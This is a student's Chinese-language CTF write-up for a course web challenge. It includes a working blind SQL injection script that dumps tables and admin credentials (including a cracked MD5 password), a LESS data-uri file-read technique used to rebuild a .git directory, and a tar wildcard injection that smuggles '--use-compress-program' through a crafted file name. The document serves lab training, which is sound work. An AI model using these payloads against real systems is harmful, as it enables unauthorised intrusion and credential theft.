# Web writeup

Done: Yes
Due date: December 28, 2022
Subject: 計算機安全

## 0x1 PasteWeb

### FLAG1

這題是一個 Login 介面，先嘗試 `a’ or 1=1 --` 發現 Username 可以做 sql injection，但是是 blind injection，只能透過回傳的 **Bad hacker! 或 Login Failed!** 來判斷是否 inject 成功，試了幾種不同的語法猜測這題應該是用 **posgresql**，所以可以用`array_to_string(array(select xxx from yyy),',')`(ref: Kaibro Web Ctf Cheetsheet)把所有查詢結果合併成 string，再用`ascii(SUBSTRING("abc", 1, 1))` 跟 **binary search** 就可以一個 char 一個 char 把資訊 leak 出來。( Bad hacker 跟 Login Failed 結果好像不會透過 Responce 封包回傳，和 r10921a11 討論後發現可以用 selenium 爬蟲爬瀏覽器資訊找到顯示的 element )

**Step 1 : Leak table name**

RESULT =  **pasteweb_accounts,s3cr3t_t4b1e,pg_statistic,pg_type,pg_for…**

**Step 2 : Leak columns name in table**

- **pasteweb_accounts**
    
    RESULT =  ***user_id,user_account,user_password***
    
- **s3cr3t_t4b1e**
    
    RESULT =  ***fl4g***
    

**Step 3: Leak  fl4g from s3cr3t_t4b1e**

*FLAG{B1inD_SqL_IiIiiNj3cT10n}*

這題大概到這裡就結束了，但我 leak 出 admin 密碼時發現無法登入，密碼像是加密過的，丟去 crack station 可以破解 md5 得到原始密碼 **P@ssw0rD**

```python
import requests
import json
import getpass
import warnings
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import time

def login(driver, username, password):
	driver.find_element(By.XPATH,"/html/body/div/div/div/form/label[1]/input").clear()
	driver.find_element(By.XPATH,"/html/body/div/div/div/form/label[2]/input").clear()
	#time.sleep(0.5)
	driver.find_element(By.XPATH,"/html/body/div/div/div/form/label[1]/input").send_keys(username)
	driver.find_element(By.XPATH,"/html/body/div/div/div/form/label[2]/input").send_keys(password)
	driver.find_element(By.XPATH,"/html/body/div/div/div/form/button").click()
	#time.sleep(0.3)
	msg = driver.find_element(By.XPATH,'/html/body/div[2]/p[2]')

	return msg.text

def boolean_leak(command):
	username = command
	password = 'nvmd'
	time.sleep(0.3)
	msg = login(driver, username, password)
	if msg == 'Bad Hacker!':
		return 1
	return 0

def binary_search(cmd):
	min_ascii = 32
	max_ascii = 126

	while(min_ascii <= max_ascii):
		guess = (min_ascii+max_ascii)//2
		#print(guess)
		big = cmd + '>' +str(guess)
		big = "a' or "+big+"--"

		small= cmd + '<' +str(guess)
		small = "a' or "+small+"--"

		if boolean_leak(big):
			min_ascii = guess+1
		elif boolean_leak(small):
			max_ascii = guess-1
		else:
			return chr(guess)
	return "....NOTHING LEFT...."
	
	

if __name__ == '__main__':
	warnings.filterwarnings('ignore')
	chrome_options = Options()
	chrome_options.add_argument('--headless')
	chrome_options.add_argument('--no-sandbox')
	chrome_options.add_argument('--disable-dev-shm-usage')
	driver = webdriver.Chrome(options=chrome_options)

	# Login
	root_url = "http://edu-ctf.zoolab.org:10210/"
	
	driver.get(root_url)
	ans = ''
	for i in range(0,500):
		# Leak tablename
		# cmd = "ascii(substr(array_to_string(array(SELECT tablename FROM pg_tables ),','),{},1))".format(i+1)
		# RESULT pasteweb_accounts,s3cr3t_t4b1e,pg_statistic,pg_type,pg_for

		# Leak pasteweb_accounts column
		# cmd = "ascii(substr(array_to_string(array(SELECT column_name FROM information_schema.columns WHERE table_name='pasteweb_accounts'),','),{},1))".format(i+1)
		# RESULT user_id,user_account,user_password

		# Leak s3cr3t_t4ble column
		# cmd = "ascii(substr(array_to_string(array(SELECT column_name FROM information_schema.columns WHERE table_name='s3cr3t_t4b1e'),','),{},1))".format(i+1)
		# RESULT fl4g
		
		# Leak user_account and user_password from pasteweb_accounts
		cmd = "ascii(substr(array_to_string(array(SELECT user_account||':'||user_password from pasteweb_accounts),','),{},1))".format(i+1)
		# RESULT admin:00ff3da3f03eb731c08c1a34de757574,p609:IGldNRiLSejE

		# Leak fl4g from s3cr3t_t4ble
		# cmd = "ascii(substr(array_to_string(array(SELECT fl4g from s3cr3t_t4b1e),','),{},1))".format(i+1)
		# RESULT FLAG{B1inD_SqL_IiIiiNj3cT10n}
	
		ans+=binary_search(cmd)
		print("CURRENT STRING LEAK:",ans,'LEN:',len(ans))
	
```

### FLAG2

這題題目要從 source code 找 flag，先查了一下 less 是什麼東西，發現透過 data-uri 這個 func 能讀取本機檔案，所以用以下語法嘗試 leak php file:

```python
.text{
	AAA: data-uri("index.php")
}
```

結果顯示 **No PHP!** ，用 Burp Suite 強制送給後端或用大小寫混肴也不行，後來看了一下 robots.txt 發現其實有 .git 可以 leak，但是無法透過網頁存取，只能用 data-uri慢慢讀取，所以網路上的還原工具基本上都不能用了。繼續查詢 git 運作原理後統整出了以下方法來把 .git 資料夾完整提取。

1. 找出一些已知路徑檔案。
    
    例如 `‘.gitignore’, '.git/info/refs', '.git/logs/HEAD', '.git/logs/refs/heads/master'....`  像這題可以 leak 出 .git/logs/HEAD ，把 data-uri 結果用 base64 decode 即可看到之前的 commit history。
    
2. 重建 commit objects。
    
    由於 git 的檔案存放邏輯為 hash 的前兩位為資料夾，後面為檔名存在 .git/objects 資料夾中，例如第一筆 commit:
    
    `f7fac4b9675f72b3333c732e7ed5a0066d78599d commit: Add flag` 
    
    Hash 值為 *f7fac4b….* 所以這個 commit object存放位置為 *.git/objects/f7/fac4b9…..* 有了存放位置跟檔名又可以用 data-uri讀出來。
    
    這時用 git cat-file “commit_hash” 即可還原 commit
    
    ```bash
    ❯ git cat-file -p f7fac4b9675f72b3333c732e7ed5a0066d78599d
    
    tree fcd8b9d52a82bc3dc614bfb80598c3483984ce99
    parent 7d7ccfd5ddfd6714a4e712e560924704ddb9c42e
    author developer <developer@gmail.xxxx> 1670356511 +0000
    committer developer <developer@gmail.xxxx> 1670356511 +0000
    
    Add flag
    ```
    
3. 重建 tree objects。
    
    從 step 2 的結果可以看到 commit 中有顯示 tree 資訊，而這個 tree 也是用相同邏輯存放的，所以我們一樣利用 data-uri 跟 hash 把 tree object 給 leak 出來。最後用 git ls-tree “tree_hash” 即可看到 tree 的資訊
    
    ```bash
    ❯ git ls-tree fcd8b9d52a82bc3dc614bfb80598c3483984ce99
    100644 blob b1d52f3b90279a6fae59195030943447c7c8977a	download.php
    100644 blob 2dfb7f975434b786b30506a537fc318d494f374c	editcss.php
    100644 blob 19092ed3c2ac784759968ba1609c3648bc365385	edithtml.php
    100644 blob 4682c0755761ff4e4724df9495f151212bebcf01	index.php
    100644 blob b66e22d6d4a2a5b9b17ca66165485cf2c8cf8025	lessc.inc.php
    100644 blob 61b703a297c84d929ff7e23004b9a731c0fb8de6	share.php
    100644 blob a360d0d06ebd2c52c1da71adc3b6e95fc838869a	view.php
    ```
    
4. Source code leak
    
    有了前幾步的經驗應該就知道怎麼對付 tree 中的 filename 跟 hash 了。用 git cat-file 讀取 source code 找到 flag
    
    ```bash
    ❯ git cat-file -p  4682c0755761ff4e4724df9495f151212bebcf01
    <?php
      // Here is your second FLAG: FLAG{a_l1tTl3_tRicKy_.git_L34k..or_D1d_y0u_f1nD_a_0Day_1n_lessphp?}
      session_start();
      if(isset($_SESSION['name'])){
        header("Location: /edithtml.php");
        die();
      }
      $now = new DateTime();
    ```
    

**Code** 

由於有大量註解（每一個 commit, tree, file 的 hash, object）所以用附檔 (FLAG.py)

### FLAG3

提示為command injection，找到 download.php 有 `shell_exec("tar -cvf download.tar *");` 這段 code ，上網查了一下針對 tar 的 wildcard injection 為建立檔名為 ***--checkpoint=1*** 還有 ***--checkpoint-action=action*** ，這樣 tar 就會把這 2 個 file name 當作 argument 執行。由於 editcss.php 中可以靠傳入 theme 來創立任意檔名，但結尾都會被裝上 .css 副檔名，這樣會讓 --checkppoint=1 這行失效，經由助教提示發現 tar不止這個 argument 能執行 shell command，我發現還有 ***--use-compress-program=COMMAND*** 這個 argument，所以整體流程為以下：

1. 用 edithtml 把 shell script 寫入 html

```bash
/readflag > index.html
# 把執行結果輸出到原檔 方便直接 view 結果
```

1. 用 burp 送一個 theme，建立一個 `-use-compress-program=sh "index.html" || *.css` 的檔案
2. 按下 Download，如果下載一個 0B 的 tar，代表 inject 成功
3. 按 view 即可看到 FLAG